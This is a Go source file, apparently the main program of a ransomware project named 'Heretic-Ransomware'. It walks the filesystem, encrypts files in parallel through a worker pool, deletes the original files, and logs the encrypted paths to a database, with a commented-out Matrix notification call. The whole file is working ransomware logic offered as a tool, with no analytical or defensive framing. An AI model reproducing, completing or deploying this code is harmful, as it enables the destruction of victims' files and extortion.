package main

import (
	json "github.com/bytedance/sonic"
	"github.com/dark-faction/Heretic-Ransomware/internal/cipher"
	"github.com/dark-faction/Heretic-Ransomware/internal/database"
	"github.com/dark-faction/Heretic-Ransomware/internal/files"
	"github.com/dark-faction/Heretic-Ransomware/internal/startup"
	"github.com/joho/godotenv"
	"github.com/panjf2000/ants/v2"
	"go.uber.org/zap"
	"runtime"
	"sync"
)

func init() {
	zap.ReplaceGlobals(zap.Must(zap.NewProduction()))

	startup.InitDb()
}

func main() {
	err := godotenv.Load()
	if err != nil {
		zap.L().Info(err.Error())
	}

	numCPU := runtime.NumCPU() * 2

	defer ants.Release()

	var wg sync.WaitGroup

	var encryptedPaths []database.EncryptedPaths

	p, _ := ants.NewPoolWithFunc(numCPU, func(fileInfo interface{}) {

		var filePathInfo cipher.FilePathInfo
		err := json.Unmarshal([]byte(fileInfo.(string)), &filePathInfo)
		if err != nil {
			zap.L().Info(err.Error())
		}

		// exclude files from encryption
		cipher.Encrypt(filePathInfo)

		files.Remove(filePathInfo.Path)

		encryptedPaths = append(encryptedPaths, database.EncryptedPaths{
			Path:     filePathInfo.Path,
			FileName: filePathInfo.FileName,
		})

		wg.Done()
	})
	defer p.Release()

	ch := make(chan string)

	// walk dirs
	go files.FileWalkerEncrypt(ch)

	for fileInfo := range ch {
		wg.Add(1)
		_ = p.Invoke(fileInfo)
	}

	wg.Wait()

	database.WritePath(encryptedPaths)

	//notification.Matrix()

	//fmt.Printf("running goroutines: %d\n", p.Running())
	//fmt.Printf("finish all tasks, result is %d\n", counter)
}
